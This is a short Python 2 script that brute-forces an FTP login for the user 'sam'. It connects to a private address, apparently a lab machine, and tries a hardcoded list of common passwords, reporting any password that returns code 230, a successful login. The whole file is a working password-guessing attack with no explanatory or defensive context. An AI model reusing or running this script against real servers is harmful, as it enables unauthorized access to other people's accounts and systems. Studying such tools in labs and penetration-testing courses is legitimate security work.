import socket

def connect(username, password):

    s = socket.socket()
    print "[*] Trying " + username + ":" + password
    s.settimeout(1)
    s.connect(('192.168.137.138', 21))
    data = s.recv(1024)

    s.send('USER ' + username + '\r\n')
    data = s.recv(1024)

    s.send('PASS ' + password + '\r\n')
    data = s.recv(3)

    s.send('QUIT\r\n')
    s.close()
    return data

username = "sam"
passwords = ["password", "12345678", "1qwer$#@!", "l33th4x0r", "root", "admin", "administrator", "ftp", "backup"]

for password in passwords:
    attempt = connect(username, password)
    if str(attempt)[:3] == "230":
        print "[+] Password found: " + password
        break
